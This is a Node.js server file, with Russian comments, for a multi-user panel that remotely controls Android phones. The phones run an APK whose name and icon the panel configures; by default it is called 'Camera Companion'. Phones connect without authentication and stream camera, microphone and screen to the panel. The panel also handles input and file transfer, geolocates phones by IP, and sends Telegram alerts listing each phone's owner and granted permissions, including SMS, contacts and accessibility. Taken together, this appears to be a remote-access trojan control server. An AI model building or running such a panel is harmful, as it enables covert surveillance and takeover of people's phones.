// Локальный сервер веб-панели управления Android через ADB.
// Запуск: npm start  (по умолчанию http://localhost:8787)

import express from 'express';
import multer from 'multer';
import { WebSocketServer } from 'ws';
import http from 'node:http';
import path from 'node:path';
import os from 'node:os';
import fs from 'node:fs';
import fsp from 'node:fs/promises';
import crypto from 'node:crypto';
const _dbgLog = fs.createWriteStream('/tmp/panel-debug.log', { flags: 'a' });
function dbg(...a) { const s = new Date().toISOString().slice(11,19) + ' ' + a.join(' ') + '\n'; _dbgLog.write(s); process.stdout.write(s); }
import { Readable } from 'node:stream';
import { fileURLToPath } from 'node:url';
import * as adb from './adb.js';
import * as builder from './builder.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PORT = process.env.PORT || 8787;
// 0.0.0.0 — чтобы телефон в той же сети мог прислать поток камеры в панель.
// Если нужен доступ только с этого ПК — задай HOST=127.0.0.1.
const HOST = process.env.HOST || '0.0.0.0';

// ---- Telegram notifications ----
const TG_TOKEN = process.env.TG_BOT_TOKEN || '';
const TG_CHAT  = process.env.TG_CHAT_ID   || '';
const GH_TOKEN_SERVER = process.env.GH_TOKEN || '';

async function tgSendMsg(text, replyMarkup) {
  if (!TG_TOKEN || !TG_CHAT) return null;
  try {
    const body = { chat_id: TG_CHAT, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    const d = await r.json();
    return d.result?.message_id || null;
  } catch { return null; }
}

async function tgEditMsg(messageId, text, replyMarkup) {
  if (!TG_TOKEN || !TG_CHAT || !messageId) return;
  try {
    const body = { chat_id: TG_CHAT, message_id: messageId, text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = replyMarkup;
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch {}
}

async function tgAnswerCb(callbackQueryId, text) {
  if (!TG_TOKEN) return;
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/answerCallbackQuery`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text: text || '' }),
    });
  } catch {}
}

const _PERM_LABELS = {
  camera: '📷 Камера', mic: '🎙 Микрофон', phone: '📱 Телефон',
  contacts: '👤 Контакты', sms: '💬 СМС', accessibility: '♿ Спец. возможности',
  projection: '🖥 Экран', notifications: '🔔 Уведомления', btConnect: '🔵 Bluetooth',
  location: '📍 Геолокация', mediaImages: '🖼 Фото', mediaVideo: '🎬 Видео',
  calendar: '📅 Календарь',
};

function _formatPhoneTgText(model, owner, perms, online) {
  const icon = online !== false ? '📱' : '📵';
  const status = online !== false ? 'Телефон подключился' : 'Телефон оффлайн';
  let text = `${icon} ${status}\nМодель: <b>${model || 'Android'}</b>`;
  if (owner) text += `\nВладелец: <b>${owner}</b>`;
  if (perms) {
    const granted = Object.entries(perms).filter(([, v]) => v).map(([k]) => _PERM_LABELS[k] || k);
    const denied  = Object.entries(perms).filter(([, v]) => !v).map(([k]) => _PERM_LABELS[k] || k);
    if (granted.length) text += `\n\n✅ Выдано:\n  ${granted.join('\n  ')}`;
    if (denied.length)  text += `\n\n❌ Не выдано:\n  ${denied.join('\n  ')}`;
  }
  return text;
}

// Ключ дедупликации: owner если задан, иначе IP.
// Это предотвращает двойное уведомление когда /control и /phone
// подключаются с разных NAT-IP одного и того же телефона.
const _tgKey = (ip, owner) => owner || ip;

const _tgRefreshKb = (key) => ({ inline_keyboard: [[{ text: '🔄 Обновить', callback_data: `refresh:${key}` }]] });

// key → { messageId, model, owner, ip }
const _tgPhoneMessages = new Map();
// key → perms (если system-info пришёл до того, как message_id записан)
const _tgPendingPerms = new Map();

// Дедупликация: не слать уведомление повторно если телефон переподключился < 2 мин назад
const _tgPhoneNotified = new Map(); // key → timestamp
function tgPhoneConnect(ip, model, owner) {
  const now = Date.now();
  const key = _tgKey(ip, owner);
  if (now - (_tgPhoneNotified.get(key) || 0) < 120_000) return;
  _tgPhoneNotified.set(key, now);
  const text = _formatPhoneTgText(model, owner, null, true);
  tgSendMsg(text, _tgRefreshKb(key)).then(msgId => {
    if (!msgId) return;
    const entry = { messageId: msgId, model: model || 'Android', owner: owner || '', ip };
    _tgPhoneMessages.set(key, entry);
    // Если system-info пришёл пока мы ждали ответа от TG — редактируем сразу
    const pending = _tgPendingPerms.get(key);
    if (pending) {
      _tgPendingPerms.delete(key);
      const editText = _formatPhoneTgText(entry.model, entry.owner, pending, true);
      tgEditMsg(msgId, editText, _tgRefreshKb(key)).catch(() => {});
    }
  }).catch(() => {});
}

// Telegram long polling — обработка нажатий на кнопку "Обновить"
let _tgPollOffset = 0;
async function _tgPollLoop() {
  while (true) {
    try {
      const ctrl = new AbortController();
      const tmo = setTimeout(() => ctrl.abort(), 35000);
      let r;
      try {
        r = await fetch(
          `https://api.telegram.org/bot${TG_TOKEN}/getUpdates?timeout=25&offset=${_tgPollOffset}&allowed_updates=%5B%22callback_query%22%5D`,
          { signal: ctrl.signal }
        );
      } finally { clearTimeout(tmo); }
      if (!r.ok) { await new Promise(res => setTimeout(res, 5000)); continue; }
      const data = await r.json();
      for (const upd of data.result || []) {
        _tgPollOffset = upd.update_id + 1;
        const cq = upd.callback_query;
        if (!cq) continue;
        const cbData = cq.data || '';
        if (cbData.startsWith('refresh:')) {
          const key = cbData.slice(8);
          const state = _tgPhoneMessages.get(key);
          // После перезапуска state пустой — ищем телефон по owner или по IP
          let lookupIp = state?.ip || null;
          if (!lookupIp) {
            for (const [pip] of phoneCallPhones.entries()) {
              if (registry[pip]?.owner === key || pip === key) { lookupIp = pip; break; }
            }
            if (!lookupIp) lookupIp = key;
          }
          const phone = phoneCallPhones.get(lookupIp);
          const online = phone?.readyState === 1;
          const reg = registry[lookupIp] || {};
          const model = reg.model || state?.model || 'Android';
          const owner = reg.owner || state?.owner || '';
          const perms = reg.perms || null;
          const text = _formatPhoneTgText(model, owner, perms, online);
          if (state) {
            await tgEditMsg(state.messageId, text, _tgRefreshKb(key));
          } else {
            const msgId = await tgSendMsg(text, _tgRefreshKb(key));
            if (msgId) _tgPhoneMessages.set(key, { messageId: msgId, model, owner, ip: lookupIp });
          }
          await tgAnswerCb(cq.id, online ? '✅ Обновлено' : '📵 Телефон оффлайн');
        }
      }
    } catch { await new Promise(res => setTimeout(res, 5000)); }
  }
}
if (TG_TOKEN) _tgPollLoop().catch(() => {});

const app = express();
app.use(express.json({ limit: '10mb' }));

// ---- Авторизация и управление пользователями ----
const USERS_FILE = path.join(__dirname, 'users.json');
let usersDb = {};

function hashPass(pass, salt) {
  return crypto.scryptSync(pass, salt, 64).toString('hex');
}
function verifyPass(pass, userEntry) {
  if (!userEntry) return false;
  try {
    return crypto.timingSafeEqual(
      Buffer.from(hashPass(pass, userEntry.salt), 'hex'),
      Buffer.from(userEntry.hash, 'hex')
    );
  } catch { return false; }
}
function saveUsers() {
  fs.writeFileSync(USERS_FILE, JSON.stringify(usersDb, null, 2));
}
(function loadUsers() {
  try { usersDb = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')); } catch {}
  if (Object.keys(usersDb).length === 0) {
    const defaultUser = process.env.PANEL_USER || 'admin';
    const defaultPass = process.env.PANEL_PASS || 'admin';
    const salt = crypto.randomBytes(16).toString('hex');
    usersDb[defaultUser] = { hash: hashPass(defaultPass, salt), salt, admin: true };
    saveUsers();
  }
})();

const SESSION_TTL = 7 * 24 * 60 * 60 * 1000; // 7 дней
const sessions = new Map(); // token → { username, createdAt }

// Защита от брутфорса: не более 10 попыток за 15 минут с одного IP
const loginAttempts = new Map();
function checkBrute(ip) {
  const now = Date.now();
  let e = loginAttempts.get(ip);
  if (!e || now > e.resetAt) { e = { count: 0, resetAt: now + 15 * 60 * 1000 }; loginAttempts.set(ip, e); }
  return ++e.count <= 10;
}

function genToken() {
  return crypto.randomBytes(32).toString('hex');
}
function getSessionCookie(req) {
  for (const part of (req.headers.cookie || '').split(';')) {
    const eq = part.indexOf('=');
    if (eq < 0) continue;
    if (part.slice(0, eq).trim() === 'panel_sid') return part.slice(eq + 1).trim();
  }
  return null;
}
function isAuth(req) {
  const t = getSessionCookie(req);
  if (!t) return false;
  const s = sessions.get(t);
  if (!s) return false;
  if (Date.now() - s.createdAt > SESSION_TTL) { sessions.delete(t); return false; }
  return true;
}
function getSessionUser(req) {
  const t = getSessionCookie(req);
  if (!t) return null;
  const s = sessions.get(t);
  if (!s || Date.now() - s.createdAt > SESSION_TTL) return null;
  return s;
}
function isAdmin(req) { const s = getSessionUser(req); return s ? !!(usersDb[s.username]?.admin) : false; }
function _autoAssignOwner(ip, ownerUsername) {
  if (!ownerUsername) return;
  if (!usersDb[ownerUsername] || usersDb[ownerUsername].admin) return;
  if (registry[ip]?.owner === ownerUsername) return; // уже назначен
  regTouch(ip, { owner: ownerUsername });
}
function _canViewPhone(username, ip) {
  if (!username) return false;
  if (usersDb[username]?.admin) return true;
  const phoneObj = phones.get(ip);
  if (phoneObj) {
    for (const [k, v] of phones.entries()) {
      if (v === phoneObj && registry[k]?.owner === username) return true;
    }
  }
  return registry[ip]?.owner === username;
}
function getActiveIpForUser(username) {
  if (!username || usersDb[username]?.admin) return activePhoneIp;
  return userActivePhone.get(username) || null;
}
function _hasAccessiblePhone(username, map) {
  if (!username) return false;
  const vai = getActiveIpForUser(username);
  if (vai && map.get(vai)?.readyState === 1) return true;
  return [...map.entries()].some(([pip, pws]) => pws.readyState === 1 && _canViewPhone(username, pip));
}
function isActiveForViewer(username, ip) {
  const vai = getActiveIpForUser(username);
  if (!vai) return false;
  if (vai === ip) return true;
  const pVai = phones.get(vai), pIp = phones.get(ip);
  return !!(pVai && pVai === pIp);
}

app.get('/login', (req, res) => {
  if (isAuth(req)) return res.redirect('/');
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});
app.post('/login', express.urlencoded({ extended: false }), (req, res) => {
  const ip = req.socket.remoteAddress || 'unknown';
  if (!checkBrute(ip)) {
    return res.redirect('/login?err=2');
  }
  const userEntry = usersDb[req.body.user];
  if (verifyPass(req.body.pass, userEntry)) {
    loginAttempts.delete(ip);
    // Инвалидируем предыдущие сессии этого пользователя при новом входе
    for (const [tok, s] of sessions.entries()) {
      if (s.username === req.body.user) sessions.delete(tok);
    }
    const token = genToken();
    sessions.set(token, { username: req.body.user, createdAt: Date.now() });
    res.setHeader('Set-Cookie', `panel_sid=${token}; Path=/; HttpOnly; SameSite=Strict`);
    return res.redirect('/');
  }
  res.redirect('/login?err=1');
});
app.get('/logout', (req, res) => {
  const token = getSessionCookie(req);
  if (token) sessions.delete(token);
  res.setHeader('Set-Cookie', 'panel_sid=; Path=/; Max-Age=0');
  res.redirect('/login');
});

// ---- Управление пользователями (только для администраторов) ----
app.get('/api/users', (req, res) => {
  if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
  const me = getSessionUser(req)?.username;
  res.json({ users: Object.entries(usersDb).map(([u, d]) => ({ username: u, admin: !!d.admin, me: u === me })) });
});
app.post('/api/users', (req, res) => {
  if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'username и password обязательны' });
  if (password.length < 6) return res.status(400).json({ error: 'Пароль не менее 6 символов' });
  if (usersDb[username]) return res.status(409).json({ error: 'Пользователь уже существует' });
  const salt = crypto.randomBytes(16).toString('hex');
  usersDb[username] = { hash: hashPass(password, salt), salt, admin: false };
  saveUsers();
  res.json({ ok: true });
});
app.delete('/api/users/:username', (req, res) => {
  if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
  const { username } = req.params;
  const me = getSessionUser(req)?.username;
  if (username === me) return res.status(400).json({ error: 'Нельзя удалить самого себя' });
  if (!usersDb[username]) return res.status(404).json({ error: 'Пользователь не найден' });
  delete usersDb[username];
  saveUsers();
  for (const [token, s] of sessions.entries()) {
    if (s.username === username) sessions.delete(token);
  }
  res.json({ ok: true });
});
app.post('/api/users/:username/password', (req, res) => {
  if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
  const { username } = req.params;
  const { password } = req.body;
  if (!password) return res.status(400).json({ error: 'password обязателен' });
  if (password.length < 6) return res.status(400).json({ error: 'Пароль не менее 6 символов' });
  if (!usersDb[username]) return res.status(404).json({ error: 'Пользователь не найден' });
  const salt = crypto.randomBytes(16).toString('hex');
  usersDb[username].hash = hashPass(password, salt);
  usersDb[username].salt = salt;
  saveUsers();
  res.json({ ok: true });
});
app.get('/api/me', (req, res) => {
  const s = getSessionUser(req);
  if (!s) return res.status(401).json({ error: 'Unauthorized' });
  res.json({ username: s.username, admin: !!(usersDb[s.username]?.admin) });
});

app.use((req, res, next) => {
  if (req.path === '/login') return next();
  if (isAuth(req)) return next();
  if (req.path.startsWith('/api/build/asset/')) return next(); // публичный endpoint для GitHub Actions CI
  if (req.path.startsWith('/api/')) return res.status(401).json({ error: 'Unauthorized' });
  res.redirect('/login');
});

app.use((req, res, next) => {
  if (req.path === '/panel.js' || req.path === '/index.html' || req.path === '/') {
    res.setHeader('Cache-Control', 'no-store');
  }
  next();
});
app.use(express.static(path.join(__dirname, 'public')));

const upload = multer({ dest: path.join(os.tmpdir(), 'arp-uploads') });

// Небольшой помощник, чтобы не дублировать try/catch в каждом маршруте.
const h = (fn) => async (req, res) => {
  try { await fn(req, res); }
  catch (e) { res.status(500).json({ error: e.message || String(e), stderr: e.stderr }); }
};

// ---- Устройства ----
app.get('/api/devices', h(async (req, res) => {
  res.json({ devices: await adb.listDevices(), current: adb.getSerial() });
}));

app.post('/api/select', h(async (req, res) => {
  adb.setSerial(req.body.serial || null);
  adb.clearSizeCache();
  res.json({ ok: true, current: adb.getSerial() });
}));

app.post('/api/connect', h(async (req, res) => {
  const out = await adb.connect(req.body.hostPort);
  res.json({ ok: true, message: out.trim() });
}));

app.post('/api/disconnect', h(async (req, res) => {
  const out = await adb.disconnect(req.body.hostPort);
  res.json({ ok: true, message: out.trim() });
}));

// ---- Информация / дашборд ----
app.get('/api/info', h(async (req, res) => res.json(await adb.deviceInfo())));
app.get('/api/battery', h(async (req, res) => res.json(await adb.battery())));
app.get('/api/screensize', h(async (req, res) => res.json(await adb.screenSize())));

// ---- Ввод (также доступен по WS, но REST удобен для кнопок) ----
app.post('/api/tap', h(async (req, res) => { await adb.tap(req.body.x, req.body.y); res.json({ ok: true }); }));
app.post('/api/swipe', h(async (req, res) => { await adb.swipe(req.body.x1, req.body.y1, req.body.x2, req.body.y2, req.body.ms); res.json({ ok: true }); }));
app.post('/api/text', h(async (req, res) => { await adb.inputText(req.body.text); res.json({ ok: true }); }));
app.post('/api/key', h(async (req, res) => {
  const code = adb.KEYCODES[req.body.name] ?? req.body.code;
  await adb.keyevent(code);
  res.json({ ok: true });
}));

// ---- Приложения ----
app.get('/api/apps', h(async (req, res) => res.json({ apps: await adb.listApps(req.query.all !== '1') })));
app.post('/api/apps/launch', h(async (req, res) => { await adb.launchApp(req.body.pkg); res.json({ ok: true }); }));
app.post('/api/apps/stop', h(async (req, res) => { await adb.forceStop(req.body.pkg); res.json({ ok: true }); }));

// ---- Уведомления ----
app.get('/api/notifications', h(async (req, res) => res.json({ items: await adb.notifications() })));
app.post('/api/notifications/post', h(async (req, res) => {
  await adb.postNotification(req.body.title || 'Панель', req.body.text || '');
  res.json({ ok: true });
}));

// ---- Файлы ----
app.get('/api/files', h(async (req, res) => {
  const p = req.query.path || '/sdcard';
  res.json({ path: p, entries: await adb.listFiles(p) });
}));

app.post('/api/files/upload', upload.single('file'), h(async (req, res) => {
  const remoteDir = req.body.remoteDir || '/sdcard/Download';
  const remotePath = remoteDir.replace(/\/$/, '') + '/' + (req.file.originalname);
  await adb.pushFile(req.file.path, remotePath);
  fs.unlink(req.file.path, () => {});
  res.json({ ok: true, remotePath });
}));

app.get('/api/files/download', h(async (req, res) => {
  const remotePath = req.query.path;
  if (!remotePath) return res.status(400).json({ error: 'path required' });
  const tmp = path.join(os.tmpdir(), 'arp-' + Date.now() + '-' + path.basename(remotePath));
  await adb.pullFile(remotePath, tmp);
  res.download(tmp, path.basename(remotePath), () => fs.unlink(tmp, () => {}));
}));

// ---- Инфо о сети (какой адрес вводить в телефоне) ----
function lanAddresses() {
  const out = [];
  for (const [name, addrs] of Object.entries(os.networkInterfaces())) {
    for (const a of addrs || []) {
      if (a.family === 'IPv4' && !a.internal) out.push({ iface: name, address: a.address });
    }
  }
  return out;
}
app.get('/api/serverinfo', (req, res) => {
  res.json({ port: server.address()?.port || PORT, addresses: lanAddresses() });
});

// ---- Сборка APK ----
app.get('/api/build/config', (req, res) => {
  res.json({
    permissions: builder.AVAILABLE_PERMISSIONS,
    hasSdk: builder.hasAndroidSdk(),
  });
});

const apkUpload = multer({ dest: path.join(os.tmpdir(), 'arp-icons') });

// Временное хранилище для splash-картинок при сборке через GitHub Actions
const multerWrap = (mw) => (req, res, next) => mw(req, res, (err) => {
  if (err) return res.status(400).json({ error: err.message || String(err) });
  next();
});
app.post('/api/build/upload-asset',
  (req, res, next) => { if (!getSessionUser(req)) return res.status(401).json({ error: 'Unauthorized' }); next(); },
  multerWrap(apkUpload.single('file')),
  h(async (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file' });
    const token = crypto.randomBytes(16).toString('hex');
    const dest = path.join(os.tmpdir(), `arp-asset-${token}`);
    await fsp.rename(req.file.path, dest);
    setTimeout(() => fsp.unlink(dest).catch(() => {}), 60 * 60 * 1000);
    res.json({ token });
  }));

// Без авторизации — для скачивания из GitHub Actions
app.get('/api/build/asset/:token', h(async (req, res) => {
  const { token } = req.params;
  if (!/^[a-f0-9]{32}$/.test(token)) return res.status(400).end();
  const filePath = path.join(os.tmpdir(), `arp-asset-${token}`);
  if (!fs.existsSync(filePath)) return res.status(404).end();
  res.sendFile(filePath);
}));
app.post('/api/build/apk', apkUpload.fields([{ name: 'icon', maxCount: 1 }, { name: 'splash', maxCount: 1 }]), h(async (req, res) => {
  const cfg = {
    appName: req.body.appName,
    applicationId: req.body.applicationId,
    permissions: (req.body.permissions || 'CAMERA').split(',').map((s) => s.trim()).filter(Boolean),
    defaultServer: req.body.defaultServer,
    ownerUsername: req.body.ownerUsername || '',
  };
  const iconFile = req.files?.icon?.[0];
  const splashFile = req.files?.splash?.[0];
  const cleanup = () => {
    if (iconFile) fs.unlink(iconFile.path, () => {});
    if (splashFile) fs.unlink(splashFile.path, () => {});
  };
  try {
    const { apkPath, fileName } = await builder.buildApk(cfg, iconFile?.path, splashFile?.path);
    cleanup();
    res.download(apkPath, fileName, () => fs.unlink(apkPath, () => {}));
  } catch (e) {
    cleanup();
    res.status(e.code === 'NO_SDK' ? 501 : 500).json({ error: e.message, code: e.code });
  }
}));

// ---- Управление камерой телефона из панели ----
app.post('/api/camera/command', h(async (req, res) => {
  const { cmd } = req.body;
  const s = getSessionUser(req);
  const username = s?.username;
  const viewerActiveIp = getActiveIpForUser(username);
  let phone = viewerActiveIp ? phones.get(viewerActiveIp) : null;
  if (!phone) {
    for (const [pip, p] of phones.entries()) {
      if (_canViewPhone(username, pip)) { phone = p; break; }
    }
  }
  const sockets = phone ? [phone.back, phone.front].filter(ws => ws?.readyState === ws?.OPEN) : [];
  if (!sockets.length) return res.status(503).json({ error: 'Телефон не подключён' });
  sockets.forEach(ws => ws.send(JSON.stringify({ cmd })));
  res.json({ ok: true });
}));

// ---- Список телефонов (все: онлайн + офлайн + удалённые) ----
app.get('/api/phones', (req, res) => {
  const s = getSessionUser(req);
  if (!s) return res.status(401).json({ error: 'Unauthorized' });
  const username = s.username;
  const full = buildFullPhoneList();
  const list = usersDb[username]?.admin ? full : full.filter(p => _canViewPhone(username, p.ip));
  res.json({ phones: list, activeIp: getActiveIpForUser(username) });
});

app.post('/api/phones/select', (req, res) => {
  const { ip } = req.body;
  if (!phones.has(ip)) return res.status(400).json({ error: 'Телефон не найден' });
  const s = getSessionUser(req);
  if (!_canViewPhone(s?.username, ip)) return res.status(403).json({ error: 'Доступ запрещён' });
  if (usersDb[s?.username]?.admin) {
    activePhoneIp = ip;
  } else {
    userActivePhone.set(s.username, ip);
  }
  notifyPhoneList();
  res.json({ ok: true, activeIp: ip });
});

app.post('/api/phones/delete', (req, res) => {
  const { ip } = req.body;
  if (!ip) return res.status(400).json({ error: 'ip required' });
  const s = getSessionUser(req);
  if (!_canViewPhone(s?.username, ip)) return res.status(403).json({ error: 'Доступ запрещён' });
  regTouch(ip, { deleted: true });
  notifyPhoneList();
  res.json({ ok: true });
});

app.post('/api/phones/restore', (req, res) => {
  const { ip } = req.body;
  if (!ip) return res.status(400).json({ error: 'ip required' });
  const s = getSessionUser(req);
  if (!_canViewPhone(s?.username, ip)) return res.status(403).json({ error: 'Доступ запрещён' });
  regTouch(ip, { deleted: false });
  notifyPhoneList();
  res.json({ ok: true });
});

app.post('/api/phones/:ip/assign', (req, res) => {
  if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
  const ip = decodeURIComponent(req.params.ip);
  const { username } = req.body;
  if (username && !usersDb[username]) return res.status(404).json({ error: 'Пользователь не найден' });
  regTouch(ip, { owner: username || null });
  notifyPhoneList();
  res.json({ ok: true });
});

// ---- GitHub Actions: сборка APK без локального SDK ----
const GH_REPO = '291010artem-ctrl/test';
// После слияния в main — сменить на 'main' или задать GH_BUILD_BRANCH в окружении
const GH_BRANCH = process.env.GH_BUILD_BRANCH || 'claude/remote-phone-control-panel-2tpseh';
const GH_WORKFLOW = 'build-apk.yml';

function ghFetch(url, token, opts = {}) {
  return fetch(url, {
    ...opts,
    headers: {
      Authorization: `Bearer ${token}`,
      Accept: 'application/vnd.github+json',
      'X-GitHub-Api-Version': '2022-11-28',
      'User-Agent': 'android-remote-panel',
      ...(opts.headers || {}),
    },
  });
}

app.post('/api/build/github', h(async (req, res) => {
  const s = getSessionUser(req);
  if (!s) return res.status(401).json({ error: 'Unauthorized' });
  const { appName, applicationId, defaultServer, ownerUsername, permissions, splashToken, iconToken } = req.body;
  if (!GH_TOKEN_SERVER) return res.status(500).json({ error: 'GH_TOKEN не настроен на сервере' });
  const permList = (permissions || '').split(',').map((p) => p.trim()).filter(Boolean);

  // URL панели — берём из заголовка запроса (включает порт), не из defaultServer
  const panelUrl = `http://${req.headers.host}`;

  const trigRes = await ghFetch(
    `https://api.github.com/repos/${GH_REPO}/actions/workflows/${GH_WORKFLOW}/dispatches`,
    GH_TOKEN_SERVER,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        ref: GH_BRANCH,
        inputs: {
          app_name: appName || 'Camera Companion',
          application_id: applicationId || 'com.artem.cameracompanion',
          default_server: defaultServer || '',
          owner_username: ownerUsername || '',
          permissions: permList.join(','),
          requested_by: s.username,
          splash_token: splashToken || '',
          icon_token: iconToken || '',
          panel_url: (splashToken || iconToken) ? panelUrl : '',
        },
      }),
    }
  );
  if (!trigRes.ok) {
    const errBody = await trigRes.text().catch(() => '');
    let errMsg = `HTTP ${trigRes.status}`;
    try { const j = JSON.parse(errBody); errMsg += ': ' + (j.message || errBody); } catch { errMsg += ': ' + errBody; }
    dbg('[build/github] dispatch failed', errMsg);
    return res.status(trigRes.status).json({ error: errMsg });
  }

  // Ждём несколько секунд пока GitHub зарегистрирует запуск
  await new Promise((r) => setTimeout(r, 4000));

  const runsRes = await ghFetch(
    `https://api.github.com/repos/${GH_REPO}/actions/runs?branch=${GH_BRANCH}&event=workflow_dispatch&per_page=5`,
    GH_TOKEN_SERVER
  );
  const runsData = await runsRes.json();
  const run = runsData.workflow_runs?.[0];
  res.json({ runId: run?.id || null, runUrl: run?.html_url || `https://github.com/${GH_REPO}/actions` });
}));

app.get('/api/build/github/status', h(async (req, res) => {
  const { runId } = req.query;
  if (!runId) return res.status(400).json({ error: 'runId required' });
  if (!GH_TOKEN_SERVER) return res.status(500).json({ error: 'GH_TOKEN не настроен' });
  const r = await ghFetch(`https://api.github.com/repos/${GH_REPO}/actions/runs/${runId}`, GH_TOKEN_SERVER);
  const d = await r.json();
  res.json({ status: d.status, conclusion: d.conclusion, url: d.html_url });
}));

app.get('/api/build/github/artifact', h(async (req, res) => {
  const { runId } = req.query;
  if (!runId) return res.status(400).json({ error: 'runId required' });
  if (!GH_TOKEN_SERVER) return res.status(500).json({ error: 'GH_TOKEN не настроен' });

  const artsRes = await ghFetch(
    `https://api.github.com/repos/${GH_REPO}/actions/runs/${runId}/artifacts`,
    GH_TOKEN_SERVER
  );
  const artsData = await artsRes.json();
  const artifact = artsData.artifacts?.[0];
  if (!artifact) return res.status(404).json({ error: 'No artifact found' });

  const dlRes = await ghFetch(
    `https://api.github.com/repos/${GH_REPO}/actions/artifacts/${artifact.id}/zip`,
    GH_TOKEN_SERVER
  );
  if (!dlRes.ok) return res.status(dlRes.status).json({ error: 'Download failed' });

  res.setHeader('Content-Type', 'application/zip');
  res.setHeader('Content-Disposition', 'attachment; filename="camera-companion-apk.zip"');
  Readable.fromWeb(dlRes.body).pipe(res);
}));

// ---- Сервер + WebSocket ----
const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });
const wssCamera = new WebSocketServer({ noServer: true });
const wssAudio = new WebSocketServer({ noServer: true });
const wssScreen = new WebSocketServer({ noServer: true });
const wssControl = new WebSocketServer({ noServer: true });
const wssPhone = new WebSocketServer({ noServer: true });

server.on('upgrade', (req, socket, head) => {
  const { pathname, searchParams } = new URL(req.url, 'http://localhost');
  const wsRole = searchParams.get('role') || 'viewer';
  // Телефон с role=phone не требует авторизации (нет куки сессии в APK)
  const phoneEndpoints = ['/camera', '/audio', '/screen', '/control', '/phone'];
  const isPhoneConn = wsRole === 'phone' && phoneEndpoints.includes(pathname);
  if (!isPhoneConn && !isAuth(req)) {
    socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
    socket.destroy();
    return;
  }
  if (!isPhoneConn) req._authUser = getSessionUser(req)?.username || null;
  console.log(`[WS] upgrade: ${pathname} from ${req.socket.remoteAddress}`);
  if (pathname === '/ws') {
    wss.handleUpgrade(req, socket, head, (ws) => wss.emit('connection', ws, req));
  } else if (pathname === '/camera') {
    wssCamera.handleUpgrade(req, socket, head, (ws) => wssCamera.emit('connection', ws, req));
  } else if (pathname === '/audio') {
    wssAudio.handleUpgrade(req, socket, head, (ws) => wssAudio.emit('connection', ws, req));
  } else if (pathname === '/screen') {
    wssScreen.handleUpgrade(req, socket, head, (ws) => wssScreen.emit('connection', ws, req));
  } else if (pathname === '/control') {
    wssControl.handleUpgrade(req, socket, head, (ws) => wssControl.emit('connection', ws, req));
  } else if (pathname === '/phone') {
    wssPhone.handleUpgrade(req, socket, head, (ws) => wssPhone.emit('connection', ws, req));
  } else {
    socket.destroy();
  }
});

// Реестр телефонов: ключ — IP-адрес, значение — { back, front, audio, model, country, countryCode, city }.
const phones = new Map();
let activePhoneIp = null; // для admin
const userActivePhone = new Map(); // username → ip (для обычных пользователей)

// Персистентный реестр устройств (все когда-либо подключавшиеся)
const REGISTRY_FILE = path.join(__dirname, 'devices.json');
let registry = {};
try {
  registry = JSON.parse(fs.readFileSync(REGISTRY_FILE, 'utf8'));
  // Сброс зависших online-статусов после перезапуска сервера
  for (const r of Object.values(registry)) if (r.online) r.online = false;
} catch {}
let _saveTimer = null;
function saveRegistry() {
  clearTimeout(_saveTimer);
  _saveTimer = setTimeout(() => fs.writeFile(REGISTRY_FILE, JSON.stringify(registry, null, 2), () => {}), 500);
}
function regTouch(ip, fields) {
  if (!registry[ip]) registry[ip] = { ip, model: 'Android', lastSeen: null, battery: null, online: false, deleted: false };
  Object.assign(registry[ip], fields);
  saveRegistry();
}
const viewerSets = { back: new Set(), front: new Set() };
const audioViewers = new Set();
const MAX_BUF = 512 * 1024; // 512 KB backpressure limit

// Нормализация IP: убираем IPv6-обёртку ::ffff: чтобы один телефон
// всегда давал одинаковый ключ независимо от протокола подключения.
const normalizeIp = (ip) => (ip || '').replace(/^::ffff:/, '');

function phoneLabel(ip) { return ip; }

// ---- Геолокация по IP (ip-api.com, бесплатно, без ключа) ----
const geoCache = new Map();
async function fetchGeo(rawIp) {
  const ip = rawIp;
  if (geoCache.has(ip)) return geoCache.get(ip);
  const isPrivate = /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|::1$|localhost)/.test(ip);
  if (isPrivate) {
    const g = { country: '', countryCode: '', city: 'Локальная сеть' };
    geoCache.set(ip, g); return g;
  }
  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=country,countryCode,city&lang=ru`);
    if (r.ok) { const g = await r.json(); geoCache.set(ip, g); return g; }
  } catch (e) { console.warn('[GEO]', e.message); }
  const g = { country: '', countryCode: '', city: '' };
  geoCache.set(ip, g); return g;
}

function getPhone(rawIp, model) {
  const ip = normalizeIp(rawIp);
  if (phones.has(ip)) {
    if (model) phones.get(ip).model = model;
    regTouch(ip, { online: true, lastSeen: Date.now(), ...(model ? { model } : {}) });
    return phones.get(ip);
  }
  // Если есть запись с той же моделью И тем же владельцем — это тот же телефон
  // с другим source IP (мобильный NAT даёт разные адреса разным TCP-соединениям).
  // Создаём алиас: новый IP → тот же объект. Дублей в buildFullPhoneList не будет.
  // Проверяем owner чтобы не сливать разные телефоны с одинаковой моделью.
  if (model) {
    const newOwner = registry[ip]?.owner ?? null;
    for (const [k, p] of phones.entries()) {
      if (p.model === model) {
        const existOwner = registry[k]?.owner ?? null;
        if (existOwner === newOwner) { phones.set(ip, p); return p; }
      }
    }
  }
